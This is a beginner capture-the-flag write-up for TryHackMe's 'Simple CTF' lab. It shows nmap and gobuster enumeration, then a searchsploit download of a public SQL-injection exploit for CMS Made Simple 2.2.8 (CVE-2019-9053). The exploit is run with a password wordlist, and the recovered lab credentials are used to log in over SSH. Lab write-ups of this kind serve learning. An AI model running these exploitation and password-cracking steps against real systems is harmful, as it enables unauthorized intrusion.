# [Simple CTF](https://tryhackme.com/room/easyctf)

> Beginner level ctf

## Scanning

We will start a nmap scan

```
nmap -A -T4 10.10.232.89
```

![image](https://user-images.githubusercontent.com/90561566/182623084-843a068a-daf3-4eed-8107-583b7fa3ed8b.png)

We found 2 services running below port 1000, namely FTP (21) and HTTP (80)

We can see that ssh is running on the higher port (2222)

## Enumeration

I just view the default web page and see nothing, so let's use gobuster to find something

```
gobuster dir -u http://10.10.232.89/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/182626562-6e7b1b36-e22b-4756-8c83-979d6b05fb34.png)

let's see /robots.txt file

![image](https://user-images.githubusercontent.com/90561566/182626985-f3fcb05b-ba8f-42f4-955c-bb6f12c5c6dc.png)

and /simple page

![image](https://user-images.githubusercontent.com/90561566/182627264-f181bf7b-db22-462e-8875-e866f6b34307.png)

at the end of page, i see its version

![image](https://user-images.githubusercontent.com/90561566/182627984-c7973e00-78cb-4207-beb5-1a7b89543498.png)

```
searchsploit cms made simple 2.2.8
```

![image](https://user-images.githubusercontent.com/90561566/182628708-3a49d796-a2cb-43a8-8f2f-30d0483c055e.png)

We can download the exploit using `searchsploit -m 46635.py`

![image](https://user-images.githubusercontent.com/90561566/182629731-a154a783-6f13-4761-9728-05ca4113bc12.png)

The CVE is CVE-2019-9053 and vulnerability type is SQLi

## Exploitation

On the script, i see some python library to install with pip and 3 parameters to use

![image](https://user-images.githubusercontent.com/90561566/182630976-ebbdf050-d62c-4aeb-8365-8d75ffe25159.png)

```
python2.7 46635.py -u http://10.10.206.254/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```

wait a while, you will find the password

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

Now try to connect ssh server with "mitch" user and a "secret" password

```
ssh mitch@10.10.206.254 -p 2222
```

and we found the user.txt flag

![image](https://user-images.githubusercontent.com/90561566/182776632-dc1958c4-d406-4d1f-8279-b481900253d5.png)








